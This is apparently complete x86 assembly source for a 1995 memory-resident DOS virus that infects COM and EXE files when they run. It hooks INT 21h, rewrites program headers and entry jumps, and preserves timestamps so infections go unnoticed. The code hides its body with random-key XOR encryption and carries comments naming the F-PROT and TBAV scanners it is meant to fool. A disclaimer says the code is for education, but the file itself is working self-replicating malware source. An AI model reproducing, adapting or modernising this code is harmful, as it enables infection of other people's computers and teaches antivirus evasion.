;
;	VIRUS05.ASM
;
;	Author: Johan Gardhage <johan.gardhage@gmail.com>
;	Originally written in 1995.
;
; Description:
; This virus is a resident infector of COM/EXE files, encrypted with an
; XOR algorithm. It uses standard interrupt vector calls to install the
; int21h handler.
;
; The virus infects on execute (4b00h).
;
; Disclaimer:
; I take no responsibility for any damage, either direct or implied,
; caused by the usage of this virus source code or of the resulting code
; after assembly. The code was written for educational purposes ONLY.
;

	.model tiny
	.code
	.startup
	locals @@

VirusSize	equ	EndVirus-BeginVirus
ParagraphSize	equ	(VirusSize+15)/16
VirusInterrupt	equ	7979h
VirusHandshake	equ	'JG'
ExeMarker	equ	'JG'
ComMarker	equ	'@'

;---------------------------------------------------------------------
;	The virus begins here
;---------------------------------------------------------------------

BeginVirus:
	jmp	EntryPoint

;---------------------------------------------------------------------
;	Start of encrypted section
;---------------------------------------------------------------------

BeginEncryptedSection:
	pop	ds					; Restore original ds

	mov	ax, es
	add	ax, 10h
	add	ax, word ptr cs:[bp+ExeHead+16h]

	push	ax					; Fool F-PROT
	pop	ax

	push	ax
	push	word ptr cs:[bp+ExeHead+14h]

	push	ds
	push	es
	push	cs
	pop	ds

	cld
	mov	ax, VirusInterrupt			; Check if in mem
	int	21h
	cmp	ax, VirusHandshake
	je	AlreadyResident

	mov	ah, 4ah					; Get size of mem
	mov	bx, 0ffffh
	int	21h

	sub	bx, ParagraphSize+1			; Make space for virus
	mov	ah, 4ah					; Change size of mem
	int	21h

	mov	ah, 48h					; Allocate memory
	mov	bx, ParagraphSize
	int	21h
	jc	AlreadyResident

	dec	ax					; ax-1 = MCB
	mov	es, ax
	mov	word ptr es:[1], 8h			; Mark DOS as owner

	sub	ax, 0fh					; Compensate org 100h
	mov	es, ax

	mov	di, 100h
	lea	si, [bp+offset BeginVirus]
	mov	cx, VirusSize
	rep	movsb					; Copy virus to mem

	push	es
	pop	ds
	mov	ax, 3521h				; Hook old INT21h
	int	21h
	mov	word ptr ds:[Int21o], bx
	mov	word ptr ds:[Int21s], es

	mov	dx, offset Int21hHandler		; Set new INT21h
	mov	ax, 2521h
	int	21h

AlreadyResident:
	pop	es
	pop	ds
	cmp	byte ptr cs:[bp+ComExe], 0
	je	RestoreCom

RestoreExe:
	retf						; Return back to program

RestoreCom:
	pop	ax
	pop	ax					; Instead of retf
	mov	di, 100h				; Restore first bytes
	lea	si, [bp+OldJmp]
	mov	cx, 4
	rep	movsb

	mov	ax, 100h				; Return back to program
	jmp	ax

ComExe	db	0
ExeHead	db	28 dup (0)
OldJmp	db	0cdh, 20h, 00h, 00h			; Buffer for 4 bytes
NewJmp	db	0e9h, 00h, 00h, ComMarker		; Buffer for entryjmp

;---------------------------------------------------------------------
;	New int 21h handler
;---------------------------------------------------------------------

Int21hHandler:
	cmp	ax, VirusInterrupt			; Return installation
	jne	@@next
	mov	ax, VirusHandshake
	iret
@@next:	cmp	ax, 4b00h				; Execute?
	je	InfectFileOnExecute

OldInt21h:						; Jump to old int21h
	db	0eah
Int21o	dw	?
Int21s	dw	?

;---------------------------------------------------------------------
;	Infect on execute (4b00h)
;---------------------------------------------------------------------

InfectFileOnExecute:
	push	ax bx cx dx si di bp ds es

	push	cs
	pop	es
	cld

	mov	ax, 3d02h				; Open file
	int	21h
	jnc	@@opened
	jmp	DoneInfect
@@opened:
	mov	bx, ax					; File handle in bx

	push	cs
	pop	ds					; The actual segment

	mov	ax, 5700h				; Get time/date
	int	21h
	push	dx
	push	cx

	mov	ah, 3fh					; Read first bytes
	mov	cx, 4
	mov	dx, offset ds:OldJmp
	int	21h

	cmp	word ptr ds:OldJmp, 'ZM'		; Check if .EXE file
	je	InfectExeFile
	cmp	word ptr ds:OldJmp, 'MZ'
	je	InfectExeFile

InfectComFile:
	cmp	byte ptr ds:OldJmp+3, ComMarker		; Don't reinfect!
	jne	@@infect_com
	jmp	CloseFile

@@infect_com:
	mov	ComExe, 0

	mov	al, 2h					; Go EOF
	call	SetFilePointer

	or	dx, dx					; > 64K?
	jnz	@@skip
	cmp	ax, (0ffffh-VirusSize)			; Dont infect too big
	jb	@@size_ok
@@skip:	jmp	CloseFile
@@size_ok:
	add	ax, offset EntryPoint-103h		; Calculate entryjmp
	mov	word ptr ds:NewJmp[1], ax		; Move it to NewJmp

	call	WriteVirus

	xor	al, al					; Go SOF
	call	SetFilePointer

	mov	ah, 40h					; Write 4 start bytes
	mov	cx, 4
	mov	dx, offset NewJmp
	int	21h

	jmp	CloseFile

InfectExeFile:
	mov	ComExe, 1

	xor	al, al					; Go SOF
	call	SetFilePointer

	mov	ah, 3fh					; Read header
	mov	cx, 1ch
	mov	dx, offset ExeHead
	int	21h

	cmp	word ptr ds:[ExeHead+12h], ExeMarker	; Don't reinfect!
	je	CloseFile

	mov	al, 2h					; Go EOF
	call	SetFilePointer

	push	dx
	push	ax

	call	WriteVirus

	mov	al, 2h					; Go EOF
	call	SetFilePointer

	mov	cx, 512
	div	cx
	or	dx, dx
	jz	@@exact
	inc	ax
@@exact:mov	word ptr ds:[ExeHead+2h], dx
	mov	word ptr ds:[ExeHead+4h], ax

	pop	ax
	pop	dx

	mov	cx, 16
	div	cx
	sub	ax, word ptr ds:[ExeHead+8h]
	add	dx, offset EntryPoint-BeginVirus
	mov	word ptr ds:[ExeHead+16h], ax
	mov	word ptr ds:[ExeHead+14h], dx

	mov	word ptr ds:[ExeHead+12h], ExeMarker

	xor	al, al					; Go SOF
	call	SetFilePointer

	mov	ah, 40h					; Write header
	mov	cx, 1ch
	mov	dx, offset ExeHead
	int	21h

	jmp	CloseFile

CloseFile:
	push	cs
	pop	ds

	mov	ax, 5701h				; Restore time/date
	pop	cx
	pop	dx
	int	21h

	mov	ah, 3eh					; Close file
	int	21h

DoneInfect:
	pop	es ds bp di si dx cx bx ax
	jmp	OldInt21h

;---------------------------------------------------------------------
;	Helper functions
;---------------------------------------------------------------------

SetFilePointer:
	mov	ah, 42h					; Jump in file
	xor	cx, cx
	cwd
	int	21h
	ret

WriteVirus:
@@loop:	mov	ah, 2ch					; Get random number
	int	21h
	or	dl, dl					; dl=0 - get another value!
	je	@@loop
	mov	word ptr ds:[Key], dx

	mov	ax, 08d00h				; Copy virus to 8d00h:100h
	mov	es, ax
	mov	di, 100h
	mov	si, di
	mov	cx, (VirusSize+1)/2
	rep	movsw
	push	es
	pop	ds
	xor	bp, bp					; And encrypt it there
	call	EncryptDecrypt

	mov	ah, 40h					; Write virus to file
	mov	cx, VirusSize
	mov	dx, offset BeginVirus
	int	21h

	push	cs					; cs=ds
	pop	ds
	ret

EndEncryptedSection:

;---------------------------------------------------------------------
;	End of encrypted section
;---------------------------------------------------------------------

EntryPoint:
	push	ax
	pop	ax
	push	ax
	pop	ax
	call	GetDelta
EncryptDecrypt:
	mov	dx, word ptr ds:[bp+Key]		; routine here to
	lea	si, [bp+BeginEncryptedSection]		; fool TBAV/F-PROT
	mov	cx, (EndEncryptedSection-BeginEncryptedSection)/2
@@loop:	xor	word ptr ds:[si], dx			; Simple xor-loop
	inc	si					; encryption
	inc	si
	loop	@@loop
	ret
Key	dw	0					; en/decrypt value
GetDelta:
	pop	bp
	sub	bp, offset EncryptDecrypt		; Get delta offset
	push	ds
	push	cs
	pop	ds
	call	EncryptDecrypt				; Decrypt virus
	jmp	BeginEncryptedSection

EndVirus:

end
